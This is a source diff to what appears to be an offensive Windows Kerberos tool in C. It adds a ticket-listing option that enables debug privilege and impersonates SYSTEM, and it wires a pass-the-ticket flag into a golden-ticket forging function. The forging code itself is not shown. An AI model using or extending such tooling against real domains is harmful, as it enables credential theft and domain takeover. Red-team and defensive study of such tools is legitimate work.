@@ -128,6 +128,7 @@ int cmd_lsa(int argc, char *argv[]) {
   struct arg_str *domain;
   struct arg_str *outfile;
   struct arg_str *infile;
+  struct arg_lit *listKerb;
   void *argtable[] = {
       help = arg_lit0(NULL, "help", "show help"),
       spn = arg_str0(NULL, "spn", "<value>", "spn/target service"),
@@ -137,6 +138,7 @@ int cmd_lsa(int argc, char *argv[]) {
       outfile = arg_str0(NULL, "outfile", "<value>", "output file for ticket"),
       infile =
           arg_str0(NULL, "input", "<value>", "input file for pass the ticket."),
+      listKerb = arg_lit0(NULL, "listKerb", "list tickets"),
       end = arg_end(20),
   };
   int narg = sizeof(argtable) / sizeof(argtable[0]);
@@ -161,6 +163,12 @@ int cmd_lsa(int argc, char *argv[]) {
     printf("Try: lsa --help\n");
     arg_freetable(argtable, narg);
     return 1;
+  }
+  if (listKerb->count > 0) {
+    EnablePrivilege("debug");
+    ImpersonateSystem();
+    ListTickets();
+    return 0;
   }
   PCredHandle credH = NULL;
   if (user->count > 0 && passwd->count > 0 && domain->count > 0 &&
@@ -291,10 +299,11 @@ int cmd_kerberos(int argc, char *argv[]) {
   struct arg_str *aes128;
   struct arg_str *aes256;
   struct arg_str *spn;
+  struct arg_lit *ptt;
 
   void *argtable[] = {
       help = arg_lit0(NULL, "help", "show help"),
-      gold = arg_lit0(NULL, "gold?", "golden ticket?"),
+      gold = arg_lit0(NULL, "gold", "golden ticket?"),
       user = arg_str1(NULL, "user", "<value>", "user to target"),
       domain = arg_str1(NULL, "domain", "<value>", "domain"),
       domainSID = arg_str0(NULL, "dsid", "<value>", "domain SID"),
@@ -302,6 +311,7 @@ int cmd_kerberos(int argc, char *argv[]) {
       aes128 = arg_str0(NULL, "aes128", "<value>", "aes128 key"),
       aes256 = arg_str0(NULL, "aes256", "<value>", "aes256 key"),
       spn = arg_str0(NULL, "spn", "<value>", "spn to target"),
+      ptt = arg_lit0(NULL, "ptt", "pass the ticket?"),
       end = arg_end(20),
   };
   if (arg_nullcheck(argtable) != 0) {
@@ -323,6 +333,10 @@ int cmd_kerberos(int argc, char *argv[]) {
     arg_freetable(argtable, narg);
     return 0;
   }
+  BOOL ptt_b = FALSE;
+  if (ptt->count > 0) {
+    ptt_b = TRUE;
+  }
   if (gold->count > 0) {
     const char *domain_str = domain->sval[0];
     const char *user_str = user->sval[0];
@@ -331,8 +345,9 @@ int cmd_kerberos(int argc, char *argv[]) {
     const char *aes256_str = aes256->sval[0];
     const char *domainSID_str = domainSID->sval[0];
     const char *spn_str = spn->sval[0];
+
     Golden(domain_str, user_str, rc4_str, aes128_str, aes256_str, domainSID_str,
-           spn_str);
+           spn_str, ptt_b);
   }
 
   return 0;
